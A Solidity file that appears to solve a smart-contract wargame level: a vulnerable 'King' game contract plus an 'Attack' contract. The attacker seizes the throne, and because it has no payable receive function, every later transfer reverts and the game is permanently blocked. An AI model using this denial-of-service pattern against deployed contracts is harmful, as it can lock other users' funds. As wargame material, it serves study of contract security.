// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address payable king;

    constructor(address payable _king) {
        king = _king;
    }

    function attack() public payable {
        (bool sent, ) = king.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() payable {
    owner = payable(msg.sender);  
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}